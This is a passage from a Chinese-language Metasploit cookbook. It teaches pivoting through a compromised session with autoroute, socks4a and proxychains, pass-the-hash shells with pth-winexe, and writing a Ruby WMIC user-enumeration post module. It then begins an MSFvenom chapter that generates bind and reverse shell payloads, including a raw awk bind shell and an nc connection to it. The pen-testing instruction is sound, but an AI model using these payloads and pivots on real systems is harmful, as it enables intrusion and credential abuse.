  \ post/windows/gather/enum_smtp\nuse post/windows/gather/enum_termserv\nuse post/windows/gather/enum_tokens\n\
  use post/windows/gather/enum_tomcat\nuse post/windows/gather/enum_trusted_locations\n\
  use post/windows/gather/enum_unattend\nmsf >\n```\n\n## Autoroute 和 socks 代理服务器\n\
  \nMetasploit 拥有大量可以帮助你实现目标的模块，但有时你可能希望利用一个会话并运行不同的甚至是自己的工具。我们可以通过将流量路由通过会话然后设置 socks\
  \ 代理来实现这一点。\n\n### 如何操作...\n\n- 1. 首先，我们需要将流量通过会话路由；在之前的配方中，我们使用了 `route` 命令。因此，这次我们将通过设置会话在我们希望通过此会话访问的子网上运行此模块，来检查通过\
  \ Meterpreter 会话的 Multi Manage Network Route 后利用模块：\n\n```\nmsf > use post/multi/manage/autoroute\n\
  msf post(autoroute) > set SESSION 1\nSESSION => 1\nmsf post(autoroute) > set SUBNET\
  \ 10.0.0.0/24\nSUBNET => 10.0.0.0/24\nmsf post(autoroute) > run\n\n[!] SESSION may\
  \ not be compatible with this module.\n[*] Running module against VAGRANT-2008R2\n\
  [*] Searching for subnets to autoroute.\n[+] Route added to subnet 10.0.0.0/255.255.255.0\n\
  from host's routing table.\n[+] Route added to subnet 192.168.216.0/255.255.255.0\n\
  from host's routing table.\n[*] Post module execution completed\nmsf post(autoroute)\
  \ >\n```\n\n- 2. 接下来，我们可以使用 Socks4a Proxy Server 辅助模块在端口 9050 上启动一个 `socks4a` 代理服务器，该服务器使用内置的\
  \ Metasploit 路由来中继连接：\n\n```\nmsf post(autoroute) > use auxiliary/server/socks4a\n\
  msf auxiliary(socks4a) > set SRVPORT 9050\nSRVPORT => 9050\nmsf auxiliary(socks4a)\
  \ > run\n[*] Auxiliary module running as background job 0.\nmsf auxiliary(socks4a)\
  \ >\n[*] Starting the socks4a proxy server\n\nmsf auxiliary(socks4a) >\n```\n\n\
  - 3. 现在，我们可以使用 ProxyChains 将连接重定向通过我们的代理服务器。在本配方中，我们将使用 nmap 对内部网络中的目标机器进行端口扫描：\n\
  \n```\nroot@kali:~# proxychains nmap -Pn -sT -sV -p 80,139,445 10.0.0.160\nProxyChains-3.1\
  \ (http://proxychains.sf.net)\n```\n\n```\nStarting Nmap 7.60 ( https://nmap.org\
  \ ) at 2017-12-09 08:56 EST\n|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<>\
  \ \n<->-OK\n|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:80-<> \n<->-OK\n|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:139-<>\
  \ \n<->-OK\n...\n\nService detection performed. Please report any incorrect results\
  \ at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in\
  \ 9.58 seconds\nroot@kali:~#\n```\n\n- 4. 然后，使用 pth-winexe 命令在目标系统上获取 shell：\n\n\
  ```\nroot@kali:~# proxychains pth-winexe -U Windows10/User%P4ssw0rd //10.0.0.160\
  \ cmd.exe\nProxyChains-3.1 (http://proxychains.sf.net)\n|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<>\
  \ \n<->-OK\nE_md4hash wrapper called.\n|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<>\
  \ \n<->-OK\n|S-chain|--<>-127.0.0.1:9050-<>-<>-10.0.0.160:445-<> \n<->-OK\nMicrosoft\
  \ Windows [Version 10.0.10586]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\
  \nC:\\Windows\\system32>hostname\nhostname\nWINDOWS10\n\nC:\\Windows\\system32>\n\
  ```\n\n正如你所见，虽然 Metasploit 为我们提供了大量模块和可能性，但我们并不局限于使用这些模块。使用 autoroute 和 socks 代理服务器，我们可以在后利用阶段使用其他工具和框架。\n\
  \n## 分析现有的后利用模块\n\n到目前为止，我们已经看到了模块的实用性以及它们可以为框架增加的强大功能。要掌握框架，了解模块的工作原理和构建方式至关重要。这将帮助我们根据需要快速扩展框架。在接下来的几个配方中，我们将向你展示如何使用\
  \ Ruby 脚本来构建自己的模块并将其导入框架。\n\n### 准备工作\n\n开始构建自己的模块，我们需要具备 Ruby 脚本的基础知识。在本配方中，我们将向你展示如何使用\
  \ Ruby 开始为框架构建模块。因此，让我们讨论一下模块构建的一些基本要求。\n\n### 如何操作...\n\n让我们从模块构建的一些基础开始：\n\n-\
  \ 1. 首先，我们需要定义一个继承辅助家族属性的类。模块可以导入多种功能，例如扫描、打开连接、使用数据库等等：\n- 2. include 语句可用于将框架的特定功能包含到我们的模块中：\n\
  - 3. 以下几行向我们介绍了模块，例如其名称、版本、作者、描述等：\n\n```\nclass MetasploitModule < Msf::Post\n\
  ```\n\n```\ninclude Msf::Post::Windows::WMIC\n```\n\n```\nclass MetasploitModule\
  \ < Msf::Post\ninclude Msf::Post::Windows::WMIC\n\ndef initialize(info={})\n  super(\
  \ update_info( info,\n    'Name' => 'Windows Gather Run Specified WMIC Command',\n\
  ```\n\n```\n'Description' => %q{ This module will execute a given WMIC command options\
  \ or read WMIC commands options from a resource file and execute the commands in\
  \ the specified Meterpreter session.},\n'License' => MSF_LICENSE,\n'Author' => [\
  \ 'Carlos Perez <carlos_perez[at]darkoperator.com>' ],\n'Platform' => [ 'win' ],\n\
  'SessionTypes' => [ 'meterpreter' ]\n)\n\nregister_options(\n[\n    OptPath.new('RESOURCE',\
  \ [false, 'Full path to resource file to read commands from.']),\n    OptString.new('COMMAND',\
  \ [false, 'WMIC command options.']),\n])\nend\n```\n\n- 4. 最后，run 方法是我们开始编写代码的地方：\n\
  \n```\n# Run Method for when run command is issued\ndef run\n  tmpout = \"\"\n \
  \ print_status(\"Running module against #{sysinfo['Computer']}\")\n  if datastore['RESOURCE']\n\
  \    if ::File.exist?(datastore['RESOURCE'])\n      ::File.open(datastore['RESOURCE'])\n\
  \        .each_line do |cmd|\n          next if cmd.strip.length < 1\n         \
  \ next if cmd[0,1] == \"#\"\n          print_status \"Running command #{cmd.chomp}\"\
  \n          result = wmic_query(cmd.chomp)\n          store_wmic_loot(result, cmd)\n\
  \        end\n    else\n      raise \"Resource File does not exists!\"\n    end\n\
  \  elsif datastore['COMMAND']\n    cmd = datastore['COMMAND']\n    result = wmic_query(cmd)\n\
  ```\n\n\n\n```\nstore_wmic_loot(result, cmd)\nend\nend\n\ndef store_wmic_loot(result_text,\
  \ cmd)\n    command_log = store_loot(\"host.command.wmic\",\n                  \
  \          \"text/plain\",\n                            session,\n             \
  \               result_text,\n                            \"#{cmd.gsub(/\\.|\\||\\\
  s/, \"_\")}.txt\",\n                            \"Command Output \\\\ 'wmic #{cmd.chomp}\\\
  \\'\")\n    print_status(\"Command output saved to: #{command_log}\")\nend\nend\n\
  ```\n\n现在我们已经建立了一些关于模块构建的基础知识，下一步将是分析该模块。强烈建议你在学习并深入了解模块和平台开发时查看现有模块。\n\n## How\
  \ it works...\n\n让我们从对主脚本体的分析开始，以了解其工作原理：\n\n- 1. 模块首先验证是否提供了资源文件。如果提供了，它将对每一行运行\
  \ WMIC 查询并存储结果：\n```\nif datastore['RESOURCE']\n  if ::File.exist?(datastore['RESOURCE'])\n\
  \    ::File.open(datastore['RESOURCE']).each_line\n    do |cmd|\n      next if cmd.strip.length\
  \ < 1\n      next if cmd[0,1] == \"#\"\n      print_status \"Running command #{cmd.chomp}\"\
  \n      result = wmic_query(cmd.chomp)\n      store_wmic_loot(result, cmd)\n   \
  \ end\n  else\n    raise \"Resource File does not exists!\"\n  end\n```\n- 2. 否则，它将检查\
  \ wmic 命令，运行它并存储结果：\n```\nelsif datastore['COMMAND']\n    cmd = datastore['COMMAND']\n\
  \    result = wmic_query(cmd)\n    store_wmic_loot(result, cmd)\nend\nend\n```\n\
  \n## Writing a post-exploitation module\n\n现在，我们已经涵盖了足够关于构建模块的背景知识。在本教程中，我们将看到如何构建自己的模块并将其添加到框架中的示例。构建模块非常方便，因为它们将使我们能够根据需要扩展框架。\n\
  \n## Getting ready\n\n让我们构建一个小型后利用模块，使用 WMIC 枚举目标上的所有用户。由于这是一个后利用模块，我们需要一个已被攻陷的目标才能执行该模块：\n\
  ```\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::WMIC\n```\n\
  脚本启动时使用扩展 Msf::Post 模块属性的类，以及包含语句以包含 WMIC 功能。\n\n接下来，我们将定义模块的名称、描述、作者、平台和会话类型：\n\
  ```\ndef initialize(info={})\n  super( update_info( info,\n    'Name' => 'Windows\
  \ WMIC User Gather',\n    'Description' => %q{\n      This module will enumerate\
  \ user accounts\n      using WMIC.\n    },\n    'License' => MSF_LICENSE,\n    'Author'\
  \ => [\n      'Daniel Teixeira <danieljc.teixeira [at]gmail.com>',\n    ],\n```\n\
  ```\n'Platform' => [ 'win' ],\n'SessionTypes' => [ 'meterpreter' ]\n))\nend\n```\n\
  \n对于 run 方法，我们将使用 wmic_query 来枚举用户账户：\n```\n# Main method\n\ndef run\n  print_status(\"\
  Executing command\")\n  command = wmic_query(\"useraccount get name\")\n  puts command\n\
  end\nend\n```\n\nMetasploit 遵循从通用到专门的层次结构来存储模块。它首先是模块的类型，例如 exploit 模块或 auxiliary\
  \ 模块。然后它采用一个通用名称，例如受影响操作系统的名称。接下来，它创建更专门的功能；例如，模块用于浏览器。最后，使用最具体的命名，例如模块所针对的浏览器的名称。\n\
  \n让我们考虑我们的模块。该模块是一个后利用模块，用于枚举 Windows 操作系统并收集有关系统的信息。因此，我们的模块应遵循此约定来存储信息。\n\n我们的目标文件夹应为\
  \ modules/post/windows/gather/。你可以用所需的名称保存模块，并使用 .rb 扩展名。让我们将其保存为 wmic_user_enum.rb。\n\
  \n## How to do it...\n\n一旦我们将模块保存在其首选目录中，下一步将是执行它并查看是否正常工作。我们已经在之前的教程中看到了模块执行的流程：\n\
  ```\nmsf exploit(psexec) > use post/windows/gather/\nwmic_user_enum\nmsf post(wmic_user_enum)\
  \ > set SESSION 1\nSESSION => 1\nmsf post(wmic_user_enum) > run\n\n[*] Executing\
  \ command\nName\nAdministrator\nanakin_skywalker\n...\n\n[*] Post module execution\
  \ completed\nmsf post(wmic_user_enum) >\n```\n\n这是一个小型示例，说明如何构建并将自己的模块添加到框架中。如果你想构建良好的模块，你\
  \ definitely 需要扎实的 Ruby 脚本知识。你也可以通过发布你的模块为 Metasploit 社区做出贡献，让其他人受益。\n"
- "## 15 Using MSFvenom\n\n在本章中，我们将涵盖以下教程：\n\n- 有效载荷和有效载荷选项\n- 编码器\n- 输出格式\n- 模板\n\
  - 带有受信任证书的 Meterpreter 有效载荷\n\n## Introduction\n\n到目前为止，你应该已经熟悉 MSFvenom，因为我们在之前的教程中已经使用过几次。MSFvenom\
  \ 是用于有效载荷生成和编码的工具，它是 `msfpayload` 和 `msfencode` 的演进，并在 2015 年 6 月 8 日取代了它们。\n\n\
  在本章中，我们将更深入地了解可用的有效载荷，了解编码器在尝试规避检测时为何有用，检查可用的可执行文件、转换输出格式等等。\n\n## Payloads and\
  \ payload options\n\n仅通过查看可用的有效载荷，我们就可以看出 MSFvenom 是最通用和有用的有效载荷生成工具之一；该列表证明 MSFvenom\
  \ 可以帮助你在几乎任何情况下获得会话。\n\n## Getting ready\n\n要开始尝试 msfvenom，请启动一个终端窗口，并使用 msfvenom\
  \ -h 或 msfvenom --help 显示帮助菜单。\n\n## How to do it...\n\n- 1. 让我们使用 -l 选项查看可用的有效载荷，使用\
  \ msfvenom 命令：\n  \n  ```\n  root@kali:~# msfvenom -l payloads\n  ```\n  \n  因为命令的输出太庞大，无法放入本教程中，我将留给你自行尝试。\n\
  \  \n- 2. 要生成有效载荷，我们始终至少需要使用两个选项，-p 和 -f。-p 选项用于指定要从 Metasploit Framework 中所有可用有效载荷中生成的有效载荷，在此示例中是通过\
  \ GNU AWK 的 bind shell：\n  \n  ```\n  root@kali:~# msfvenom -p cmd/unix/bind_awk\
  \ -f raw\n  No platform was selected, choosing Msf::Module::Platform::Unix from\
  \ the payload\n  No Arch selected, selecting Arch: cmd from the payload\n  No encoder\
  \ or badchars specified, outputting raw payload\n  Payload size: 96 bytes\n  awk\
  \ 'BEGIN{s=\"/inet/tcp/4444/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'\n\
  \  ```\n- 3. -f 选项用于指定输出格式，要列出所有可用格式，请使用 --help-formats 选项运行 msfvenom：\n```\nroot@kali:~#\
  \ msfvenom --help-formats\nExecutable formats\n  asp, aspx, aspx-exe, axis2, dll,\
  \ elf, elf-so, exe,\nexe-only, exe-service, exe-small, hta-psh, jar, jsp,\nloop-vbs,\
  \ macho, msi, msi-nouac, osx-app, psh, psh-cmd,\npsh-net, psh-reflection, vba, vba-exe,\
  \ vba-psh, vbs,\nwar\nTransform formats\n  bash, c, csharp, dw, dword, hex, java,\
  \ js_be,\njs_le, num, perl, pl, powershell, ps1, py, python,\nraw, rb, ruby, sh,\
  \ vbapplication, vbscript\n```\n\nmsfvenom 中有两种格式，可执行格式和转换格式。可执行格式将生成程序和脚本，而转换格式仅会生成有效载荷。\n\
  \n- 4. 我们还可以通过使用 -p 选项与 - 来指定自定义有效载荷，这在尝试规避安全解决方案时可能很有用：\n```\nroot@kali:~# cat\
  \ custom.raw | msfvenom -p - -a x64\n--platform linux -f elf -o custom.elf\nAttempting\
  \ to read payload from STDIN...\nNo encoder or badchars specified, outputting raw\n\
  payload\nPayload size: 86 bytes\nFinal size of elf file: 206 bytes\nSaved as: custom.elf\n\
  root@kali:~#\n```\n\n在生成有效载荷时，我们使用 -a 选项指定要使用的架构，使用 --platform 指定有效载荷的平台，并使用 -o\
  \ 保存有效载荷。\n\n- 5. 要列出所有可用平台，请使用 --help-platforms 选项运行 msfvenom：\n```\nroot@kali:~#\
  \ msfvenom --help-platforms\nPlatforms\n  aix, android, bsd, bsdi, cisco, firefox,\
  \ freebsd,\nhardware, hpux, irix, java, javascript, linux,\nmainframe, multi, netbsd,\
  \ netware, nodejs, openbsd,\nosx, php, python, r, ruby, solaris, unix, windows\n\
  root@kali:~#\n```\n\n6. 在进行漏洞利用开发时，一个有用的功能是 --smallest 选项，我们可以用它来生成尽可能小的有效载荷：\n\n\
  ```\nroot@kali:~# msfvenom -p linux/x64/shell_bind_tcp -f elf --smallest -o small.elf\n\
  No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n\
  No Arch selected, selecting Arch: x64 from the payload\nNo encoder or badchars specified,\
  \ outputting raw payload\nPayload size: 86 bytes\nFinal size of elf file: 206 bytes\n\
  Saved as: small.elf\nroot@kali:~#\n```\n\n7. 要测试此有效载荷，我们可以使用 chmod 命令设置执行权限，然后运行有效载荷：\n\
  \n```\nroot@kali:~# chmod +x small.elf\nroot@kali:~# ./small.elf\n```\n\n8. 在另一个终端中，我们可以使用\
  \ netcat 连接到端口 4444 上的 bind shell：\n\n```\nroot@kali:~# nc 127.0.0.1 4444\nhostname\n\
  kali\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n太好了，我们有一个可以使用的精简 Linux\
  \ 有效载荷\n\n9. 现在我们已经学会了如何创建基本的 bind shell，我们将尝试创建 reverse shell。首先，我们需要查看所选有效载荷的可用选项，我们可以使用\
  \ --payload-options 选项来完成：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_601_0.png)\n\
  \n10. 可用的选项令人眼花缭乱，但就目前而言，我们只需要设置基本选项，例如监听地址和端口：\n\n```\nroot@kali:~# msfvenom -p\
  \ linux/x64/shell/reverse_tcp LHOST=192.168.216.5 LPORT=1234 -f elf -o reverse.elf\n\
  No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n\
  No Arch selected, selecting Arch: x64 from the payload\nNo encoder or badchars specified,\
  \ outputting raw payload\nPayload size: 127 bytes\nFinal size of elf file: 247 bytes\n\
  Saved as: reverse.elf\nroot@kali:~#\n```\n\n11. 要测试我们的有效载荷，我们首先需要在 Metasploit 中使用\
